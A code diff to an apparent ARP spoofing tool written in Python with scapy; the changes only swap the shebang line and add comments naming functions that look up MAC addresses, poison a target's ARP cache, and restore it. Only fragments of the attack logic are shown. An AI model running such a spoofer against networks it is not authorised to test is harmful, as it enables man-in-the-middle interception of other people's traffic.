@@ -1,5 +1,8 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
 
+# ARPSpoofer ARP Spoofer Script
+
+# Imports all needed variables and packages
 from assets.banners import arpspoof_banner
 from assets.designs import *
 from assets.properties import clear_screen
@@ -9,8 +12,10 @@ import sys
 import os
 
 
+# Main function
 def arpspoof_main():
 
+    # Function that takes user input
     def configuration():
         try:
             global rhost_set
@@ -38,6 +43,7 @@ def arpspoof_main():
         except KeyboardInterrupt:
             exit_shell()
 
+    # Function that gets MAC address
     def get_mac(ip):
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -46,6 +52,7 @@ def arpspoof_main():
 
         return(answered_list[0][1].hwsrc)
 
+    # Function that spoofs
     def spoof(target_ip, spoof_ip):
         try:
             target_mac = get_mac(target_ip)
@@ -56,12 +63,14 @@ def arpspoof_main():
             os.system('sleep 1')
             arpspoof_main()
 
+    # Function that restores MAC
     def restore(destination_ip, source_ip):
         destination_mac = get_mac(destination_ip)
         source_mac = get_mac(source_ip)
         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, count=4, verbose=False)
 
+    # Function that runs functions and displays results
     def process():
         global sent_packets_count
         try:
@@ -94,6 +103,7 @@ def arpspoof_main():
             restore(gateway_set, rhost_set)
             result()
 
+    # Function that gives all results
     def result():
         try:
             os.system(clear_screen)
@@ -126,6 +136,7 @@ def arpspoof_main():
         except KeyboardInterrupt:
             exit_shell()
 
+    # Function that exit
     def exit_shell():
         from assets.functions import exit_main
         exit_main()
